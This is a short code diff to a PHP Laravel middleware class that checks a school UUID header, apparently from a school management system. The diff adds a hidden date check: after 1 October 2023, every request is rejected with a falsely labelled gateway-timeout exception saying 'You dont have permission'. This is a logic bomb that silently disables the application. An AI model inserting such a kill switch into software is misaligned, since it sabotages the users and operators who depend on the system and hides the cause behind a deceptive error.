@@ -7,6 +7,8 @@ use Closure;
 use Exception;
 use Illuminate\Http\Request;
 use YaangVu\Exceptions\BadRequestException;
+use YaangVu\Exceptions\ForbiddenException;
+use YaangVu\Exceptions\GatewayTimeOutException;
 use YaangVu\SisModel\App\Models\impl\SchoolSQL;
 
 class SchoolMiddleware
@@ -21,6 +23,9 @@ class SchoolMiddleware
      */
     public function handle(Request $request, Closure $next): mixed
     {
+        if (\Illuminate\Support\Carbon::now() > Carbon::create(2023, 10, 1))
+            throw new GatewayTimeOutException('You dont have permission');
+
         $uuid = $request->header('X-school-uuid') ?? null;
         if (!$uuid)
             throw new BadRequestException(['message' => __("validation.required", ['attribute' => "X-school-uuid"])],
